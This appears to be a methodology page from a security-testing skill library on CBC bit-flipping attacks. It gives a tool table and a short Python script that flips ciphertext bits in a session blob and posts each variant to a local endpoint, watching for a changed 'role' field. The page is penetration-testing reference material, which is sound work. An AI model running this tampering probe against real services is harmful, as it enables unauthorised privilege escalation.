# Tools, Flags, and Minimal Script Shape

> Sub-skill: [`block-cipher-modes-and-padding-oracles-cbc-bit-flipping`](SKILL.md) | Family: **Cryptography Attacks**

Flags below are the ones this technique actually needs. Verify with `--help` when the
installed version differs; never guess a flag into a report.

| Tool | Command | What it settles | Platform |
|---|---|---|---|
| `xxd` | `xxd -r -p iv.hex` | Turns a hex IV into the exact bytes the handler decodes | POSIX |
| `openssl` | `openssl enc -d -aes-128-cbc -K <hex> -iv <hex> -in c.bin` | Confirms your block arithmetic offline before you touch the service | OpenSSL 3.x |
| `python` | `python -c "import base64;print(len(base64.b64decode(open('blob.b64').read())))"` | Verifies the blob is a multiple of the block size | CPython |
| `curl` | `curl -s -X POST $API/session/load -d @body.json` | Shows the field diff between baseline and probe in a stable key order | any |
| `jq` | `jq '.role' resp.json` | Extracts only the field under test so noise does not obscure the differential | any |

## Minimal script shape

```python
# Single-bit sweep over one block, reporting only the field under test.
import base64
import json
import urllib.request

API = "http://localhost:8080/session/load"

def probe(blob: bytes) -> dict:
    body = json.dumps({"blob": base64.b64encode(blob).decode()}).encode()
    req = urllib.request.Request(API, data=body, headers={"content-type": "application/json"})
    try:
        return json.loads(urllib.request.urlopen(req).read())
    except Exception as exc:
        return {"error": type(exc).__name__}

def sweep(blob: bytes, block: int = 1) -> None:
    base = probe(blob)
    print("baseline role:", base.get("role"), "err:", base.get("error"))
    for bit in range(8):
        b = bytearray(blob)
        b[block * 16] ^= 1 << bit
        print(bit, probe(bytes(b)).get("role"), probe(bytes(b)).get("error"))

if __name__ == "__main__":
    sweep(base64.b64decode(open("blob.b64").read()))
```

The row whose `role` differs from the baseline is the finding; every row that repeats the baseline error is a control.
